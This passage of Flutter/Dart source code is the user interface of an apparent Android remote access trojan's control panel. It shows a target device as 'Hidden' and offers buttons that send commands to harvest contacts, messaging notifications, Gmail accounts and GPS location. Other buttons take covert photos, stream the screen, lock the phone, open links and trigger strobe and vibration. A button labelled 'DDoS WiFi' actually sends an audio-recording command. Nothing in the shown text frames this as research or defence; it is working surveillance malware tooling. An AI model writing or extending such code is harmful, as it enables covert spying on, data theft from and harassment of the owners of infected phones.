          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(model, style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Colors.white)),
            Text(targetId, style: const TextStyle(fontSize: 10, color: Colors.white38)),
          ],
        ),
        actions: [
          if (_isSending)
            Container(
              margin: const EdgeInsets.only(right: 15),
              child: const Center(
                child: SizedBox(
                  width: 20,
                  height: 20,
                  child: CircularProgressIndicator(
                    strokeWidth: 2,
                    color: accentBlue,
                  ),
                ),
              ),
            ),
          Container(
            margin: const EdgeInsets.only(right: 10),
            child: IconButton(
              onPressed: () {
                setState(() {});
                _sendCommand("force_open", targetId, isSilent: true);
              },
              icon: const Icon(Icons.refresh, size: 20, color: accentLightBlue),
            ),
          ),
        ],
      ),
      body: urlRat == null
          ? Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Container(
                    padding: const EdgeInsets.all(20),
                    decoration: BoxDecoration(
                      color: cardBlue,
                      shape: BoxShape.circle,
                    ),
                    child: const SizedBox(
                      width: 40,
                      height: 40,
                      child: CircularProgressIndicator(
                        color: accentBlue,
                        strokeWidth: 3,
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),
                  const Text("Loading RAT Configuration...",
                    style: TextStyle(color: Colors.white38, fontSize: 12)),
                ],
              ),
            )
          : ListView(
              padding: const EdgeInsets.only(bottom: 20),
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                  color: secondaryDarkBlue,
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: successGreen.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: successGreen.withOpacity(0.3)),
                        ),
                        child: Row(
                          children: [
                            const Icon(Icons.battery_full, color: successGreen, size: 14),
                            const SizedBox(width: 4),
                            Text("${device?['battery'] ?? '100'}%",
                              style: const TextStyle(color: successGreen, fontSize: 11, fontWeight: FontWeight.bold)),
                          ],
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: accentBlue.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: accentBlue.withOpacity(0.3)),
                        ),
                        child: Row(
                          children: [
                            const Icon(Icons.android, color: accentBlue, size: 14),
                            const SizedBox(width: 4),
                            const Text("Android", style: TextStyle(color: accentBlue, fontSize: 11)),
                          ],
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: warningOrange.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: warningOrange.withOpacity(0.3)),
                        ),
                        child: Row(
                          children: [
                            const Icon(Icons.visibility_off, color: warningOrange, size: 14),
                            const SizedBox(width: 4),
                            const Text("Hidden", style: TextStyle(color: warningOrange, fontSize: 11)),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
                
                _buildLogContainer(),

                _buildControlBlock(
                  "Intelligence Extraction",
                  "Contacts, Notifications, WhatsApp, Telegram, Facebook, SMS, Gmail List",
                  Icons.folder_shared,
                  accentCyan,
                  [
                    _buildActionButton("Get Contacts", Icons.contacts, accentCyan, "get_contacts", targetId),
                    _buildActionButton("Messages", Icons.message, accentCyan, "get_notif_logs", targetId),
                    _buildActionButton("Gmail List", Icons.account_circle, accentCyan, "get_gmails", targetId),
                    _buildActionButton("Request Access", Icons.security, accentCyan, "open_notification_settings", targetId),
                  ]
                ),

                _buildControlBlock(
                  "Audio Control",
                  "Remote MP3 Player and Sound Hijack",
                  Icons.volume_up,
                  warningOrange,
                  [
                    _buildActionButton("Play MP3", Icons.play_arrow, warningOrange, "play_audio_input", targetId),
                    _buildActionButton("Stop Sound", Icons.stop, Colors.white, "stop_audio", targetId),
                  ]
                ),

                _buildControlBlock(
                  "Location Tracking",
                  "Live real-time GPS tracking",
                  Icons.location_on,
                  successGreen,
                  [
                    _buildActionButton("Get Location", Icons.my_location, successGreen, "get_location", targetId),
                  ]
                ),

                _buildControlBlock(
                  "Network Attack",
                  "WiFi Jammer & Interference",
                  Icons.wifi,
                  Colors.deepPurpleAccent,
                  [
                    _buildActionButton("DDoS WiFi", Icons.sensors_off, Colors.deepPurpleAccent, "record_audio", targetId),
                  ]
                ),

                _buildControlBlock(
                  "Media & Surveillance",
                  "Background Instant Photo & Real Screen Stream",
                  Icons.camera_alt,
                  warningOrange,
                  [
                    _buildActionButton("Instant Photo", Icons.camera, warningOrange, "take_photo", targetId),
                    _buildActionButton("Screen Stream", Icons.screenshot, warningOrange, "get_screen", targetId),
                    _buildActionButton("Set Wallpaper", Icons.image, accentBlue, "set_wallpaper", targetId),
                    _buildActionButton("Strobe ON", Icons.flash_on, warningOrange, "flash_strobe", targetId),
                    _buildActionButton("Strobe OFF", Icons.flash_off, Colors.white, "stop_strobe", targetId),
                  ]
                ),

                _buildControlBlock(
                  "Remote Control",
                  "Lock, Unlock, Vibrate, Web Trigger",
                  Icons.smartphone,
                  dangerRed,
                  [
                    _buildActionButton("Lock", Icons.lock, dangerRed, "hard_lock", targetId),
                    _buildActionButton("Unlock", Icons.lock_open, successGreen, "unlock", targetId),
                    _buildActionButton("Open Link", Icons.link, dangerRed, "open_url", targetId),
                    _buildActionButton("Vibrate", Icons.vibration, dangerRed, "vibrate_loop", targetId),
                  ]
                ),
              ],
            ),
    );
  }
}